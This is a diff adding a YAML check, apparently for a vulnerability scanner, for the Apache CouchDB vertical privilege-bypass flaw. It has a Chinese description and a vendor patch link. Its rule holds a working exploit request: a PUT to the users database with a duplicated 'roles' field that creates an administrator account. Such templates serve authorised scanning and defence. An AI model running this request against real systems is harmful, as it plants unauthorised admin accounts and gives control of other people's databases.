@@ -1,0 +1,26 @@
+set:
+  r1: randomStr(32)
+vulname: Couchdb 垂直权限绕过漏洞
+level: 高危
+description: |
+  Apache CouchDB是美国阿帕奇（Apache）软件基金会的一个免费、开源、面向文档的数据库，是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。
+  Apache CouchDB 1.7.0之前的版本和2.1.1之前的2.x版本中存在安全漏洞，该漏洞源于基于rlang的JSON解析器和基于JavaScript的JSON解析器之间存在差异。攻击者可利用该漏洞访问任意的shell命令或获取管理员权限。
+solution: |
+  目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
+  https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E
+rules:
+  - method: PUT
+    path: /_users/org.couchdb.user:{{r1}}
+    headers:
+      Content-Type: application/json
+      Content-Length: '192'
+    data: |-
+      {
+        "type": "user",
+        "name": "{{r1}}",
+        "roles": ["_admin"],
+        "roles": [],
+        "password": "fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9"
+      }
+    allow_redirects: True
+    expression: response.status == 201 and response.content.contains('org.couchdb.user:' + {{r1}})
